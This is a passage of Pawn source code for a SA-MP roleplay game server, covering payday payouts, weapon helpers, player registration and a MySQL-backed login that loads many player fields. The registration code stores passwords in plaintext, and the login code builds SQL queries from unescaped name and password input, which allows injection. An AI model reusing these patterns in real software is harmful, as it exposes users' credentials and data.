				    format(stringsu,sizeof(stringsu),"You receive only half the interest the bank because you played only %d minutes of this hour (around 31 necessary interest).",PlayerInfo[i][pPayDay]/60+1);
				    SendSplitMessage(i, COLOR_LIGHTBLUE, stringsu);
				}
				PlayerInfo[i][pExp] += 1;
				addVV(PlayerInfo[i][pBAccLY], PlayerInfo[i][pBAcc], finalinterest);
				new mymoney[LY_STRING_LEN];  
				GetLYString(PlayerInfo[i][pBAccLY], PlayerInfo[i][pBAcc], mymoney);
				format(string, sizeof(string), "Paycheck: $%s | Bank balance: $%s | Bank interest: $%s | Tax: $%s (10 percent)", FormatNumber(checks), FormatBigNumber(mymoney), FormatNumber(finalinterest), FormatNumber(TaxValue));
				SendClientMessage(i, COLOR_GREY, string);
				format(string3, sizeof(string3), "Rent: $%s | Total earnings: $%d", FormatNumber(rent[i]), checks-TaxValue);
				SendClientMessage(i, COLOR_GREY, string3);
				SendClientMessage(i, COLOR_TEAL, "----------------------------------------------------------------------------");
				format(string, sizeof(string), "~y~payday");
				GameTextForPlayer(i, string, 5000, 1);
				if(PlayerInfo[i][pCarLicT] > 0)
				{
					PlayerInfo[i][pCarLicT] -= 1;
				}
				if(PlayerInfo[i][pFlyLicT] > 0)
				{
					PlayerInfo[i][pFlyLicT] -= 1;
				}
				if(PlayerInfo[i][pBoatLicT] > 0)
				{
					PlayerInfo[i][pBoatLicT] -= 1;
				}
				if(PlayerInfo[i][pGunLicT] > 0)
				{
					PlayerInfo[i][pGunLicT] -= 1;
				}
				if(PlayerInfo[i][pFpunish] > 0)
				{
					PlayerInfo[i][pFpunish]--;
		 		}
		 		if(PlayerInfo[i][pFpunish] < 0)
		 		{
	    			PlayerInfo[i][pFpunish] = 0;
				}
				if(PlayerInfo[i][pCarLicSuspend] > 0)
				{
					PlayerInfo[i][pCarLicSuspend]--;
					Update(i, pCarLicSuspendx);
					if(PlayerInfo[i][pCarLicSuspend] == 0) SendClientMessage(i, COLOR_YELLOW, "* Your driving license was confiscated recently. Now you can go back to driving school to get licensed again.");
				}
				if(PlayerInfo[i][pGunLicSuspend] > 0)
				{
					PlayerInfo[i][pGunLicSuspend]--;
					Update(i, pGunLicSuspendx);
					if(PlayerInfo[i][pGunLicSuspend] == 0) SendClientMessage(i, COLOR_YELLOW, "* Your arms license was confiscated recently. Now you can give the test again with an instructor to get a license again.");
				}
   				if(IsACop(i))
				{
    				PlayerInfo[i][pLawyer] += 1;
				}
				PlayerInfo[i][pPayCheck] = 0;
				if(PlayerInfo[i][pLevel] == 1 || PlayerInfo[i][pLevel] == 2 || PlayerInfo[i][pLevel] == 3 || PlayerInfo[i][pLevel] == 4)
				{
    				expamount = PlayerInfo[i][pLevel]*2;
					if(PlayerInfo[i][pExp] >= expamount)
					{
	    				SCM(i,COLOR_LIGHTBLUE,"** You can use buylevel because you have necessary respect points.");
					}
				}
				else if(PlayerInfo[i][pLevel] >= 5)
				{
    				expamount = PlayerInfo[i][pLevel]*3;
					if(PlayerInfo[i][pExp] >= expamount)
					{
	    				SCM(i,COLOR_LIGHTBLUE,"** You can use buylevel because you have necessary respect points.");
					}
				}
				new strsql[1000];
				mysql_format(SQL, strsql, sizeof(strsql), "UPDATE `users` SET `OnlineHourWeek`=OnlineHourWeek+1 WHERE `id`='%d'",PlayerInfo[i][pSQLID]);
				mysql_tquery(SQL, strsql, "", "");
				if(ofertazilei == 1 && PlayerInfo[i][pDailyBonus] == 1)
				{
					PlayerInfo[i][pDailyPayDay]++;
					Update(i, pDailyPayDayx);
					if(ofertazilei == 1 && PlayerInfo[i][pDailyBonus] == 1)
					{
						if(PlayerInfo[i][pDailyPayDay] == 5)
						{
							PlayerInfo[i][pDailyBonus] = 0;
							new sqlupdate[1000];
							mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `DailyBonus`='0' WHERE `id` = '%d'",PlayerInfo[i][pSQLID]);
							mysql_tquery(SQL, sqlupdate, "","");
							SCM(i, COLOR_SERVER, "{0066FF}Daily Deals: {FFFFFF}You receive 150 Premium Points, 10 Points respectively, $ 25 million offer because you filled day.");
							GivePlayerCash(i, 25000000);
							PlayerInfo[i][pExp] += 10;
							PlayerInfo[i][pPremiumPoints] += 150;
							Update(i, pCashx);
							Update(i, pRP);
							Update(i, pPremiumPointsx);
						}
					}
				}
				if(ofertazilei == 4 && PlayerInfo[i][pDailyBonus] == 1)
				{
					PlayerInfo[i][pDailyPayDay]++;
					Update(i, pDailyPayDayx);
					if(ofertazilei == 4 && PlayerInfo[i][pDailyBonus] == 1)
					{
						if(PlayerInfo[i][pDailyPayDay] == 8)
						{
							PlayerInfo[i][pDailyBonus] = 0;
							new sqlupdate[1000];
							mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `DailyBonus`='0' WHERE `id` = '%d'",PlayerInfo[i][pSQLID]);
							mysql_tquery(SQL, sqlupdate, "","");
							SCM(i, COLOR_SERVER, "{0066FF}Daily Deals: {FFFFFF}You receive 300 Premium Points, 15 Points respectively, $ 40 million offer because you filled day.");
							GivePlayerCash(i, 40000000);
							PlayerInfo[i][pExp] += 15;
							PlayerInfo[i][pPremiumPoints] += 300;
							Update(i, pCashx);
							Update(i, pRP);
							Update(i, pPremiumPointsx);
							PlayerInfo[i][pDailyPayDay] = 0;
							Update(i, pDailyPayDayx);
						}
					}
				}
			}
		}
	}
	for(new x = 0; x < MAX_GROUPS; x++)
	{
	    DynamicFactions[x][fBank] += DynamicFactions[x][fPaydayMoney];
	    mysql_format(SQL,str,sizeof(str),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'",DynamicFactions[x][fBank],x);
		mysql_tquery(SQL,str,"","");
	}
	return 1;
}
stock IsVehicleDrivingBackwards(vehicleid)
{
        new Float:Float[3];
        if(GetVehicleVelocity(vehicleid, Float[1], Float[2], Float[0]))
        {
                GetVehicleZAngle(vehicleid, Float[0]);
                if(Float[0] < 90)
                {
                        if(Float[1] > 0 && Float[2] < 0) return true;
                }
                else if(Float[0] < 180)
                {
                        if(Float[1] > 0 && Float[2] > 0) return true;
                }
                else if(Float[0] < 270)
                {
                        if(Float[1] < 0 && Float[2] > 0) return true;
                }
                else if(Float[1] < 0 && Float[2] < 0) return true;
        }
        return false;
}
stock GetWeaponSlot (weaponid)
{
	switch (weaponid)
	{
		case 0, 1:
			return 0;

		case 2 .. 9:
			return 1;
		case 10 .. 15:
			return 10;
		case 16 .. 19, 39:
			return 8;
		case 22 .. 24:
			return 2;
		case 25 .. 27:
			return 3;
		case 28, 29, 32:
			return 4;
		case 30, 31:
			return 5;
		case 33, 34:
			return 6;
		case 35 .. 38:
			return 7;
		case 40:
			return 12;
		case 41 .. 43:
			return 9;

		case 44 .. 46:
			return 11;
	}
	return 0;
}

stock GivePlayerWeaponEx(playerid,weapon,ammo)
{
	WeaponData[playerid][GetWeaponSlot(weapon)] = true;
	return GivePlayerWeapon(playerid,weapon,ammo);
}

stock ResetPlayerWeaponsEx(playerid)
{
	WeaponData[playerid][0] = false; WeaponData[playerid][1] = false; WeaponData[playerid][2] = false; WeaponData[playerid][3] = false;
	WeaponData[playerid][4] = false; WeaponData[playerid][5] = false; WeaponData[playerid][6] = false; WeaponData[playerid][7] = false;
	WeaponData[playerid][8] = false; WeaponData[playerid][9] = false; WeaponData[playerid][10] = false; WeaponData[playerid][11] = false;
	WeaponData[playerid][12] = false;
	return ResetPlayerWeapons(playerid);
}

stock GetWeaponNameEx(id, name[], len) return format(name,len, "%s", GunNames[id]);

stock RemovePlayerWeapon(playerid, weaponid);
public RemovePlayerWeapon(playerid, weaponid)
{
	new plyWeapons[12] = 0,
		plyAmmo[12] = 0;
	for(new sslot = 0; sslot != 12; sslot++)
	{
		new wep, ammo;
		GetPlayerWeaponData(playerid, sslot, wep, ammo);
		if(wep != weaponid && ammo != 0) GetPlayerWeaponData(playerid, sslot, plyWeapons[sslot], plyAmmo[sslot]);
	}
	ResetPlayerWeaponsEx(playerid);
	ResetPlayerWeapons(playerid);
	for(new sslot = 0; sslot != 12; sslot++)
	{
	    if(plyAmmo[sslot] != 0) GivePlayerWeaponEx(playerid, plyWeapons[sslot], plyAmmo[sslot]);
	}
	return 1;
}

public split(const strsrc[], strdest[][], delimiter)
{
	new i,
		li,
		aNum,
		len;
	while(i <= strlen(strsrc)){
	    if(strsrc[i]==delimiter || i==strlen(strsrc)){
	        len = strmid(strdest[aNum], strsrc, li, i, 128);
	        strdest[aNum][len] = 0;
	        li = i+1;
	        aNum++;
		}
		i++;
	}
	return 1;
}

public OnPlayerRegister(playerid, password[])
{
	if(IsPlayerConnected(playerid))
	{
		new playername3[MAX_PLAYER_NAME];
		GetPlayerName(playerid, playername3, sizeof(playername3));
		new Str[200];
		mysql_format(SQL,Str,sizeof(Str),"INSERT INTO `users` (`name`,`password`) VALUES ('%s','%s')",playername3,password);
		mysql_tquery(SQL,Str,"","");
		strmid(PlayerInfo[playerid][pKey], password, 0, strlen(password), 255);
		PlayerInfo[playerid][pCash] = GetPlayerCash(playerid);
	    GetPlayerHealthEx(playerid,PlayerInfo[playerid][pHealth]);
		if ((PlayerInfo[playerid][pPos_x]==0.0 && PlayerInfo[playerid][pPos_y]==0.0 && PlayerInfo[playerid][pPos_z]==0.0))
		{
     	    PlayerInfo[playerid][pPos_x] = 2246.6;
     	    PlayerInfo[playerid][pPos_y] = -1161.9;
     	    PlayerInfo[playerid][pPos_z] = 1029.7;
		}
		if(Spectate[playerid] != -1)
		{
			PlayerInfo[playerid][pPos_x] = Unspec[playerid][sPx];
			PlayerInfo[playerid][pPos_y] = Unspec[playerid][sPy];
			PlayerInfo[playerid][pPos_z] = Unspec[playerid][sPz];
			PlayerInfo[playerid][pInt] = Unspec[playerid][sPint];
			PlayerInfo[playerid][pLocal] = Unspec[playerid][sLocal];
		}
		new str[128];
		mysql_format(SQL,str,128,"UPDATE users SET `pHealth`='%.1f' WHERE `name`='%s'",PlayerInfo[playerid][pHealth],PlayerInfo[playerid][pNormalName]);
		mysql_tquery(SQL,str,"","");
		ShowPlayerDialog(playerid,DIALOG_LOGIN2,DIALOG_STYLE_PASSWORD,"SERVER: Login","Welcome to the TopZone RPG Server.\n\nPlease enter your password below!","Login","Cancel");
		return 1;
	}
	return 1;
}

public OnPlayerLogin(playerid,password[])
{
	new playername2[MAX_PLAYER_NAME];
	new clasaipdb[128];
    GetPlayerName(playerid, playername2, sizeof(playername2));
    new playerip[16];
	GetPlayerIp(playerid,playerip,sizeof(playerip));
	if(NumIp(playerip, playerid) >= 2)
	{
 		SendClientMessage(playerid, COLOR_ERROR, "There are already 1 player connected with same IP.");
 		Kick(playerid);
 		return 1;
	}
    new qstr[256];
    if(loginautomat[playerid] == 0) format(qstr,100,"SELECT * FROM users WHERE `name`='%s' AND `password`='%s'",playername2,password);
    if(loginautomat[playerid] == 1) format(qstr,100,"SELECT * FROM users WHERE `name`='%s'",playername2);
    new Cache: pass = mysql_query(SQL,qstr);
    if(cache_get_row_count() > 0)
    {
		cache_get_field_content(0, "password", PlayerInfo[playerid][pKey], SQL, 130);
    	cache_get_field_content(0, "name", PlayerInfo[playerid][pNormalName], SQL, 130);
    	PlayerInfo[playerid][pLevel]                    = cache_get_field_content_int(0, "Level");
    	PlayerInfo[playerid][pAdmin]                    = cache_get_field_content_int(0, "Admin");
    	PlayerInfo[playerid][pMP3]                    	= cache_get_field_content_int(0, "PlayerMP3");
    	PlayerInfo[playerid][pHelper]                   = cache_get_field_content_int(0, "Helper");
    	PlayerInfo[playerid][pPremiumAccount]           = cache_get_field_content_int(0, "Premium");
    	PlayerInfo[playerid][pPremiumPoints]            = cache_get_field_content_int(0, "PremiumPoints");
    	PlayerInfo[playerid][pConnectTime]              = cache_get_field_content_int(0, "ConnectedTime");
    	PlayerInfo[playerid][pReg]                      = cache_get_field_content_int(0, "Registered");
    	PlayerInfo[playerid][pSex]                      = cache_get_field_content_int(0, "Sex");
    	PlayerInfo[playerid][pAge]                      = cache_get_field_content_int(0, "Age");
		PlayerInfo[playerid][pGasCan]                   = cache_get_field_content_int(0, "GasCan");
    	PlayerInfo[playerid][pOrigin]                   = cache_get_field_content_int(0, "Origin");
    	PlayerInfo[playerid][pMuted]                    = cache_get_field_content_int(0, "Muted");
	 	PlayerInfo[playerid][pMuteTime]                 = cache_get_field_content_int(0, "MuteTime");
    	PlayerInfo[playerid][pExp]                      = cache_get_field_content_int(0, "Respect");
    	PlayerInfo[playerid][pCasatorit]                = cache_get_field_content_int(0, "Casatorit");
    	PlayerInfo[playerid][pDailyBonus]               = cache_get_field_content_int(0, "DailyBonus");
    	PlayerInfo[playerid][pPaydayuri]                = cache_get_field_content_int(0, "Paydayuri");
    	PlayerInfo[playerid][pCash]                     = cache_get_field_content_int(0, "Money");
		PlayerInfo[playerid][pSQLID]                    = cache_get_field_content_int(0, "id");
		cache_get_field_content(0, "Bank2",PlayerInfo[playerid][pAccount], SQL, MAX_LY_STRING);
    	PlayerInfo[playerid][pCrimes]                   = cache_get_field_content_int(0, "Crimes");
    	PlayerInfo[playerid][pKills]                    = cache_get_field_content_int(0, "Kills");
    	PlayerInfo[playerid][pDeaths]                   = cache_get_field_content_int(0, "Deaths");
    	PlayerInfo[playerid][pArrested]                 = cache_get_field_content_int(0, "Arrested");
    	PlayerInfo[playerid][pWantedDeaths]             = cache_get_field_content_int(0, "WantedDeaths");
    	PlayerInfo[playerid][pPhoneBook]                = cache_get_field_content_int(0, "Phonebook");
    	PlayerInfo[playerid][pWantedLevel]              = cache_get_field_content_int(0, "WantedLevel");
    	PlayerInfo[playerid][pFishes]                   = cache_get_field_content_int(0, "Fishes");
    	PlayerInfo[playerid][pJob]                      = cache_get_field_content_int(0, "Job");
    	PlayerInfo[playerid][pPayCheck]                 = cache_get_field_content_int(0, "Paycheck");
    	PlayerInfo[playerid][pVip]	                    = cache_get_field_content_int(0, "ContVip");
    	PlayerInfo[playerid][pColors]	                = cache_get_field_content_int(0, "Colors");
    	PlayerInfo[playerid][pReferral]	                = cache_get_field_content_int(0, "Referral");
    	PlayerInfo[playerid][pHeadValue]                = cache_get_field_content_int(0, "HeadValue");
    	PlayerInfo[playerid][pJailed]                   = cache_get_field_content_int(0, "Jailed");
    	PlayerInfo[playerid][pJailTime]                 = cache_get_field_content_int(0, "JailTime");
    	PlayerInfo[playerid][pMats]                     = cache_get_field_content_int(0, "Materials");
    	PlayerInfo[playerid][pDrugs]                    = cache_get_field_content_int(0, "Drugs");
    	PlayerInfo[playerid][pLeader]                   = cache_get_field_content_int(0, "Leader");
    	PlayerInfo[playerid][pMember]                   = cache_get_field_content_int(0, "Member");
    	PlayerInfo[playerid][pRank]                     = cache_get_field_content_int(0, "Rank");
    	PlayerInfo[playerid][pFACWarns]                 = cache_get_field_content_int(0, "FWarn");
    	PlayerInfo[playerid][pFpunish]                  = cache_get_field_content_int(0, "FPunish");
    	PlayerInfo[playerid][pLawyer]                   = cache_get_field_content_int(0, "Acceptpoints");
    	PlayerInfo[playerid][pFishSkill]                = cache_get_field_content_int(0, "FishSkill");
    	PlayerInfo[playerid][pSpawnChange]              = cache_get_field_content_int(0, "SpawnChange");
 		PlayerInfo[playerid][pRobSkill]                 = cache_get_field_content_int(0, "RobSkill");
    	PlayerInfo[playerid][pTruckSkill]               = cache_get_field_content_int(0, "TruckSkill");
    	PlayerInfo[playerid][pTruckTimes]               = cache_get_field_content_int(0, "TruckTimes");
    	PlayerInfo[playerid][pTruckRem]                 = cache_get_field_content_int(0, "TruckRem");
    	PlayerInfo[playerid][pFarmSkill]                = cache_get_field_content_int(0, "FarmSkill");
    	PlayerInfo[playerid][pFarmTimes]                = cache_get_field_content_int(0, "FarmTimes");
    	PlayerInfo[playerid][pFarmRem]                  = cache_get_field_content_int(0, "FarmRem");
		PlayerInfo[playerid][pPizzaSkill]               = cache_get_field_content_int(0, "PizzaSkill");
    	PlayerInfo[playerid][pPizzaTimes]               = cache_get_field_content_int(0, "PizzaTimes");
    	PlayerInfo[playerid][pPizzaRem]                 = cache_get_field_content_int(0, "PizzaRem");
		PlayerInfo[playerid][pArmsSkill]                = cache_get_field_content_int(0, "ArmsSkill");
		PlayerInfo[playerid][pArmsTimes]                = cache_get_field_content_int(0, "ArmsTimes");
		PlayerInfo[playerid][pArmsRem]                	= cache_get_field_content_int(0, "ArmsRem");
		PlayerInfo[playerid][pCurierRem]                = cache_get_field_content_int(0, "CurierRem");
		PlayerInfo[playerid][pCurierSkill]              = cache_get_field_content_int(0, "CurierSkill");
		PlayerInfo[playerid][pCurierTimes]              = cache_get_field_content_int(0, "CurierTimes");		
		PlayerInfo[playerid][pCarieraRem]                = cache_get_field_content_int(0, "CarieraRem");
		PlayerInfo[playerid][pCarieraSkill]              = cache_get_field_content_int(0, "CarieraSkill");
		PlayerInfo[playerid][pCarieraTimes]              = cache_get_field_content_int(0, "CarieraTimes");	
		PlayerInfo[playerid][pDailyPayDay]              = cache_get_field_content_int(0, "DailyPayDay");	
		PlayerInfo[playerid][pCimentRem]                = cache_get_field_content_int(0, "CimentRem");
		PlayerInfo[playerid][pCimentSkill]              = cache_get_field_content_int(0, "CimentSkill");
		PlayerInfo[playerid][pCimentTimes]              = cache_get_field_content_int(0, "CimentTimes");
		PlayerInfo[playerid][pBusSkill]                	= cache_get_field_content_int(0, "BusSkill");
		PlayerInfo[playerid][pBusTimes]                	= cache_get_field_content_int(0, "BusTimes");
		PlayerInfo[playerid][pBusRem]                	= cache_get_field_content_int(0, "BusRem");
    	PlayerInfo[playerid][pFishTimes]                = cache_get_field_content_int(0, "FishTimes");
    	PlayerInfo[playerid][pFishRem]                  = cache_get_field_content_int(0, "FishRem");
    	PlayerInfo[playerid][pRobRem]                   = cache_get_field_content_int(0, "RobRem");
    	PlayerInfo[playerid][pRobTimes]                 = cache_get_field_content_int(0, "RobTimes");
    	PlayerInfo[playerid][pHealth]                   = cache_get_field_content_float(0, "pHealth");
    	PlayerInfo[playerid][pInt]                      = cache_get_field_content_int(0, "Inter");
    	PlayerInfo[playerid][pLocal]                    = cache_get_field_content_int(0, "Local");
    	PlayerInfo[playerid][pTeam]                     = cache_get_field_content_int(0, "Team");
    	PlayerInfo[playerid][pModel]                    = cache_get_field_content_int(0, "Model");
    	PlayerInfo[playerid][pPnumber]                  = cache_get_field_content_int(0, "PhoneNr");
    	PlayerInfo[playerid][pPhousekey]                = cache_get_field_content_int(0, "House");
    	PlayerInfo[playerid][pPhousekey2]                = cache_get_field_content_int(0, "House2");
    	PlayerInfo[playerid][pPbiskey]                  = cache_get_field_content_int(0, "Bizz");
    	PlayerInfo[playerid][pPos_x]                    = cache_get_field_content_float(0, "Pos_x");
    	PlayerInfo[playerid][pPos_y]                    = cache_get_field_content_float(0, "Pos_y");
    	PlayerInfo[playerid][pPos_z]                    = cache_get_field_content_float(0, "Pos_z");
    	PlayerInfo[playerid][pRob]                      = cache_get_field_content_int(0, "Rob");
    	PlayerInfo[playerid][pCarLicT]                  = cache_get_field_content_int(0, "CarLicT");
    	PlayerInfo[playerid][pCarLic]                   = cache_get_field_content_int(0, "CarLic");
		PlayerInfo[playerid][pCarLicSuspend]            = cache_get_field_content_int(0, "CarLicSuspend");
		PlayerInfo[playerid][pGunLicSuspend]            = cache_get_field_content_int(0, "GunLicSuspend");
    	PlayerInfo[playerid][pFlyLicT]                  = cache_get_field_content_int(0, "FlyLicT");
    	PlayerInfo[playerid][pFlyLic]                   = cache_get_field_content_int(0, "FlyLic");
    	PlayerInfo[playerid][pBoatLicT]                 = cache_get_field_content_int(0, "BoatLicT");
    	PlayerInfo[playerid][pBoatLic]                  = cache_get_field_content_int(0, "BoatLic");
    	PlayerInfo[playerid][pGunLicT]                  = cache_get_field_content_int(0, "GunLicT");
    	PlayerInfo[playerid][pGunLic]                   = cache_get_field_content_int(0, "GunLic");
    	PlayerInfo[playerid][pPayDay]                   = cache_get_field_content_int(0, "PayDay");
    	PlayerInfo[playerid][pTut]                      = cache_get_field_content_int(0, "Tutorial");
    	PlayerInfo[playerid][pWarns]                    = cache_get_field_content_int(0, "Warnings");
    	PlayerInfo[playerid][pRented]                   = cache_get_field_content_int(0, "Rented");
    	PlayerInfo[playerid][pFuel]                     = cache_get_field_content_int(0, "Fuel");
    	PlayerInfo[playerid][pWTalkie]                  = cache_get_field_content_int(0, "WTalkie");
    	cache_get_field_content(0, "Email", PlayerInfo[playerid][pEmail], SQL, 255);
    	cache_get_field_content(0, "RegisterDate", PlayerInfo[playerid][pRegistredDate], SQL, 255);
    	PlayerInfo[playerid][pClan]                     = cache_get_field_content_int(0, "Clan");
    	PlayerInfo[playerid][pHitT]                     = cache_get_field_content_int(0, "HitT");
    	PlayerInfo[playerid][pCRank]                    = cache_get_field_content_int(0, "CRank");
		PlayerInfo[playerid][pCWarns]                   = cache_get_field_content_int(0, "ClanWarns");
    	PlayerInfo[playerid][pPhone]                    = cache_get_field_content_int(0, "Phone");
    	PlayerInfo[playerid][pPcarkey]                  = cache_get_field_content_int(0, "Carkey");
    	PlayerInfo[playerid][pCarkey7]                  = cache_get_field_content_int(0, "Carkey7");
    	PlayerInfo[playerid][pCarkey8]                  = cache_get_field_content_int(0, "Carkey8");
    	PlayerInfo[playerid][pCarkey9]                  = cache_get_field_content_int(0, "Carkey9");
    	PlayerInfo[playerid][pCarkey10]                 = cache_get_field_content_int(0, "Carkey10");
    	PlayerInfo[playerid][pCarkey11]                 = cache_get_field_content_int(0, "Carkey11");
    	PlayerInfo[playerid][pCarkey12]                 = cache_get_field_content_int(0, "Carkey12");
    	PlayerInfo[playerid][pCarkey13]                 = cache_get_field_content_int(0, "Carkey13");
    	PlayerInfo[playerid][pCarkey14]                 = cache_get_field_content_int(0, "Carkey14");
    	PlayerInfo[playerid][pCarkey15]                 = cache_get_field_content_int(0, "Carkey15");
    	PlayerInfo[playerid][pmotokey]                  = cache_get_field_content_int(0, "motokey");
    	PlayerInfo[playerid][pprcarkey2]                = cache_get_field_content_int(0, "prcarkey2");
    	PlayerInfo[playerid][pPPluscarkey]              = cache_get_field_content_int(0, "pluscarkey");
    	PlayerInfo[playerid][pPPluscarkey2]             = cache_get_field_content_int(0, "pluscarkey2");
    	PlayerInfo[playerid][pPlusSlot1]                = cache_get_field_content_int(0, "PlusSlot1");
    	PlayerInfo[playerid][pPlusSlot2]                = cache_get_field_content_int(0, "PlusSlot2");
    	PlayerInfo[playerid][phelikey]                  = cache_get_field_content_int(0, "helikey");
    	PlayerInfo[playerid][pprcarkey]                 = cache_get_field_content_int(0, "prcarkey");
    	cache_get_field_content(0, "Victim", PlayerInfo[playerid][pVictim], SQL, 255);
    	cache_get_field_content(0, "Accused", PlayerInfo[playerid][pAccused], SQL, 255);
    	cache_get_field_content(0, "Crime1", PlayerInfo[playerid][pCrime1], SQL, 255);
    	cache_get_field_content(0, "Crime2", PlayerInfo[playerid][pCrime2], SQL, 255);
    	cache_get_field_content(0, "Crime3", PlayerInfo[playerid][pCrime3], SQL, 255);
    	PlayerInfo[playerid][pStatus]                   = cache_get_field_content_int(0, "Status");
    	PlayerInfo[playerid][pALeader]                  = cache_get_field_content_int(0, "ALeader");
    	PlayerInfo[playerid][pLanguage]                 = cache_get_field_content_int(0, "Language");
    	PlayerInfo[playerid][pClanTag]                  = cache_get_field_content_int(0, "ClanTag");
    	PlayerInfo[playerid][pFWorks]                   = cache_get_field_content_int(0, "FWorks");
    	PlayerInfo[playerid][pVirtualPD]                = cache_get_field_content_int(0, "VirtualPD");
    	PlayerInfo[playerid][pGlasses]                  = cache_get_field_content_int(0, "Glasses");
    	PlayerInfo[playerid][pFactionTime]              = cache_get_field_content_int(0, "FactionTime");
    	PlayerInfo[playerid][pCredits]                  = cache_get_field_content_int(0, "CreditsF");
    	PlayerInfo[playerid][pNMuted]                   = cache_get_field_content_int(0, "NMuted");
    	PlayerInfo[playerid][pHelpedPlayers]            = cache_get_field_content_int(0, "HelpedPlayers");
    	PlayerInfo[playerid][pHCar]            			= cache_get_field_content_int(0, "HelperCar");
    	PlayerInfo[playerid][pHToken]            		= cache_get_field_content_int(0, "HelperToken");
    	PlayerInfo[playerid][pGPoints]                  = cache_get_field_content_int(0, "GPoints");
    	PlayerInfo[playerid][pHost]            			= cache_get_field_content_int(0, "Host");
    	PlayerInfo[playerid][pPhoneBlock]            	= cache_get_field_content_int(0, "PhoneBlock");
    	PlayerInfo[playerid][pHiddenColor]            	= cache_get_field_content_int(0, "HiddenColor");
    	PlayerInfo[playerid][pGiftTime]            		= cache_get_field_content_int(0, "GiftTime");
    	PlayerInfo[playerid][pHats]                     = cache_get_field_content_int(0, "Hats");
    	PlayerInfo[playerid][pFightStyle]               = cache_get_field_content_int(0, "FightStyle");
    	PlayerInfo[playerid][pHUD1]               		= cache_get_field_content_int(0, "HUD1");
    	PlayerInfo[playerid][pHUD2]               		= cache_get_field_content_int(0, "HUD2");
    	PlayerInfo[playerid][pHUD3]              	 	= cache_get_field_content_int(0, "HUD3");
    	PlayerInfo[playerid][pRunners]                  = cache_get_field_content_int(0, "Runners");
    	PlayerInfo[playerid][pArrestss]                 = cache_get_field_content_int(0, "Arrests");
    	PlayerInfo[playerid][pTickets]                 	= cache_get_field_content_int(0, "Tickets");
    	PlayerInfo[playerid][pDConfiscate]              = cache_get_field_content_int(0, "DConfiscate");
    	PlayerInfo[playerid][pLConfiscate]              = cache_get_field_content_int(0, "DLonfiscate");
    	PlayerInfo[playerid][pContracts]              	= cache_get_field_content_int(0, "Contracts");
    	PlayerInfo[playerid][pNews]              		= cache_get_field_content_int(0, "News");
    	PlayerInfo[playerid][pLives]              		= cache_get_field_content_int(0, "Live");
    	PlayerInfo[playerid][pOrders]              		= cache_get_field_content_int(0, "Orders");
    	PlayerInfo[playerid][pDDeposit]              	= cache_get_field_content_int(0, "DDeposit");
    	PlayerInfo[playerid][pMDeposit]              	= cache_get_field_content_int(0, "MDeposit");
    	PlayerInfo[playerid][pMUsed]              		= cache_get_field_content_int(0, "MUsed");
    	PlayerInfo[playerid][pWKills]              		= cache_get_field_content_int(0, "WKills");
    	PlayerInfo[playerid][pWDeaths]              	= cache_get_field_content_int(0, "WDeaths");
    	PlayerInfo[playerid][pLGiven]              		= cache_get_field_content_int(0, "LGiven");
    	PlayerInfo[playerid][pPHeals]              		= cache_get_field_content_int(0, "PHeals");
		cache_get_field_content(0, "CuvantCheie", PlayerInfo[playerid][pCuvant], SQL, 255);
		cache_get_field_content(0, "NumarTelefon", PlayerInfo[playerid][pNrTel], SQL, 255);
		cache_get_field_content(0, "ClasaIPTel", clasaipdb, SQL, 255);
		for(new ev=0; ev<=50; ev++)
		{
			new strb[30];
			format(strb, sizeof(strb),"Quest%d",ev);
			QEvent[playerid][ev] = cache_get_field_content_int(0, strb);
		}
	}
	else
	{
		new stringyy[320],
			loginname[64];
		GetPlayerName(playerid,loginname,sizeof(loginname));
		gPlayerLogTries[playerid] -= 1;
		if(gPlayerLogTries[playerid] == 1 || gPlayerLogTries[playerid] == 0)
		{
			format(stringyy,sizeof(stringyy),"{FF0000}Incorrect password. You have %d remaining login attempts left.", gPlayerLogTries[playerid]);
			SendClientMessage(playerid, COLOR_RED, stringyy);
		}
		ShowPlayerDialog(playerid,DIALOG_LOGIN2,DIALOG_STYLE_PASSWORD,"SERVER: Login","Welcome to the TopZone RPG Server.\n\nPlease enter your password below!","Login","Cancel");
        if(gPlayerLogTries[playerid] == -1)
		{
		    new stringkick[256];
		    format(stringkick, sizeof(stringkick), "AdmWarn: {FFFFFF}%s has been kicked for entering the wrong password 2 times.",loginname);
		   	ABroadCast(COLOR_RED2,stringkick,1);
			KickEx(playerid);
		}
        return 1;
	}
	cache_delete(pass);
	ResetPlayerCash(playerid);
	GivePlayerCash(playerid,PlayerInfo[playerid][pCash]);
	CurrentMoney[playerid] = PlayerInfo[playerid][pCash];

	new name2[MAX_PLAYER_NAME];
	GetPlayerName(playerid,name2,sizeof(name2));

	/*if(PlayerInfo[playerid][pOneHost] == 0)
	{
		PlayerInfo[playerid][pOneHost] = 1;

		new var[256];
		mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Host`='%s' WHERE `name`='%s'",GetPlayerHost(playerid),name2);
		mysql_tquery(SQL, var,"","");
	}
	if(PlayerInfo[playerid][pHost] != GetPlayerHost(playerid)) {
		SCM(playerid, COLOR_RED, "TEST: asdasd!");
	//	Kick(playerid);
	}*/

	if(PlayerInfo[playerid][pReg] == 0)
	{
		PlayerInfo[playerid][pLevel] = 1;
		PlayerInfo[playerid][pHealth] = 100.0;
 	    PlayerInfo[playerid][pPos_x] = 2246.6;
 	    PlayerInfo[playerid][pPos_y] = -1161.9;
 	    PlayerInfo[playerid][pPos_z] = 1029.7;
		PlayerInfo[playerid][pInt] = 0;
		PlayerInfo[playerid][pLocal] = 255;
		PlayerInfo[playerid][pTeam] = 3;
		PlayerInfo[playerid][pModel] = 250;
		PlayerInfo[playerid][pPnumber] = 0;
		PlayerInfo[playerid][pPhousekey] = 999;
		PlayerInfo[playerid][pPhousekey2] = 999;
		PlayerInfo[playerid][pPbiskey] = 255;
		addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], 1000);
		PlayerInfo[playerid][pPcarkey] = 0;
		PlayerInfo[playerid][pmotokey] = 0;
		PlayerInfo[playerid][pprcarkey2] = 0;
		PlayerInfo[playerid][pPPluscarkey] = 0;
		PlayerInfo[playerid][pPPluscarkey2] = 0;
		PlayerInfo[playerid][phelikey] = 0;
		PlayerInfo[playerid][pprcarkey] = 0;
		PlayerInfo[playerid][pCarkey7] = 0;
		PlayerInfo[playerid][pCarkey8] = 0;
		PlayerInfo[playerid][pCarkey9] = 0;
		PlayerInfo[playerid][pCarkey10] = 0;
